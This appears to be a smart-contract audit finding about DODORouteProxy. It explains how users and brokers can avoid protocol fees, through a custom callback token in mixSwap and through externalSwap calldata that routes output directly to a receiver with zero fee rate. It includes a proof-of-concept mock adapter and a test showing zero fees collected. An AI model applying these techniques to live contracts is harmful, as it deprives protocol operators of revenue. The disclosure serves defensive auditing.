# Users and brokers can use the protocol without paying fees

## Summary

Users and brokers can use the protocol without paying fees

## Vulnerability Detail

The protocol charges fees in the `_routeWithdraw` function and the fee is decided according to the `receiveAmount`.

1. Mix Swap and DODO Mutli Swap
   For simplicity, let us see `mixSwap`.
   A caller is free in selection of `assetTo, mixAdapters, mixPairs` as long as the array lengths match and there are no additional checks.
   So one can create a custom ERC20 token with callback (e.g. `beforeTransfer`) and also a custom simple adapter (with `WETH` and the custom ERC token as base/quote token for example).
   Then he creates a custom contract for the custom token and in the `beforeTransfer` callback he can put custom logic to send a very small amount back to the sender.
   Now if he calls `mixSwap` with his contract address as the last element of `assetTo` (also custom adapter/pair properly and `minReturnAmount=1` or whatever very small), the protocol will process the other swaps normally and finally sends the funds to the custom contract and then the protocol will get very little amount back.
   So the `receiveAmount` becomes very small. Because the fees are calculated by `floor` operations, the protocol will get no fees.

2. External Swap
   A user can call `externalSwap` with arbitrary parameters including `minReturnAmount`, `feeData` and `callDataConcat`.
   Note that for the `externalSwap`, the protocol does not check if `minReturnAmount` is zero.
   And of course the user can set `feeRate` of the `feeData` parameter to zero.
   Now for the `callDataConcat`, one can use any kind of function signature supported by the `swapTarget` and most of the swap protocols expose a function that has a `receiver` parameter.
   One might argue that it is not reasonable because `swapTarget` is an approved one but most of the swap protocols expose this kind of function so it is still worthwhile to explore.
   Below is an example for [1inch](https://github.com/1inch/liquidity-protocol/blob/7ee3f0e88b45bb83ce3981cbe6bad87a4fc13423/contracts/Mooniswap.sol#L255).

   ```solidity
   function swapFor(IERC20 src, IERC20 dst, uint256 amount, uint256 minReturn, address referral, address payable receiver) public payable nonReentrant whenNotShutdown returns(uint256 result) {
       ...
       (confirmed, result, virtualBalances) = _doTransfers(src, dst, amount, minReturn, receiver, balances, fees);
       ...
   }
   ```

   So with a proper call data, a user can directly get the swap result and the protocol can not charge any fees because the `receiveAmount` (DODORouteProxy.sol#L220) is zero.

   A test (with 1inch in mind) is given below.

   ```solidity
   // mocks/MockAdapter.sol
   contract MockAdapter is IDODOAdapter{
        ...

        // https://github.com/1inch/liquidity-protocol/blob/7ee3f0e88b45bb83ce3981cbe6bad87a4fc13423/contracts/Mooniswap.sol#L255
        function swapFor(IERC20 srcToken, IERC20 dstToken, uint256 amount, uint256 minReturn, address referral, address payable receiver) public payable returns(uint256 result) {
            uint256 outAmount = DecimalMath.mulFloor(amount, price); // just a PoC
            dstToken.transfer(receiver, outAmount);
        }
        ...
    }
   ```

   ```ts
   // integration/DODORouteProxy.test.ts
   it("external swap without paying fee", async () => {
     // set approve white list and swap white list
     await dodoRouteProxy.connect(alice).addWhiteList(mockAdapter.address)
     await dodoRouteProxy.connect(alice).addApproveWhiteList(mockAdapter.address)

     let abiCoder = new ethers.utils.AbiCoder()
     let feeData = await abiCoder.encode(["address", "uint256"], [brokerAddr, "0"]) // no broker fees

     let ABI = [
       "function swapFor(address src, address dst, uint256 amount, uint256 minReturn, address referral, address payable receiver)"
     ]
     let itf = new ethers.utils.Interface(ABI)
     let callData = itf.encodeFunctionData("swapFor", [
       token1.address,
       token2.address,
       BIG_NUMBER_1E18.mul(1).toString(),
       0,
       ethers.constants.AddressZero, // no referral
       bobAddr // receiver address
     ])

     let beforeBob = await token2.balanceOf(bobAddr)
     let previousProtocol = await token2.balanceOf(proxy1Addr)
     let previousBroker = await token2.balanceOf(brokerAddr)

     await dodoRouteProxy.connect(bob).externalSwap(
       token1.address,
       token2.address,
       mockAdapter.address,
       mockAdapter.address,
       BIG_NUMBER_1E18.mul(1).toString(),
       "0", // minimum return 0
       feeData,
       callData,
       "99999999999"
     )
     let afterBob = await token2.balanceOf(bobAddr)
     let afterProtocol = await token2.balanceOf(proxy1Addr)
     let afterBroker = await token2.balanceOf(brokerAddr)
     console.log("Bob token2 balance before/after", etherToNumber(beforeBob), etherToNumber(afterBob)) // 100 101
     console.log("Protocol fee", afterProtocol - previousProtocol) // 0
     console.log("Broker fee", afterBroker - previousBroker) // 0
   })
   ```

## Impact

Users and brokers can use the protocol without paying fees and it will affect the protocol's business model.
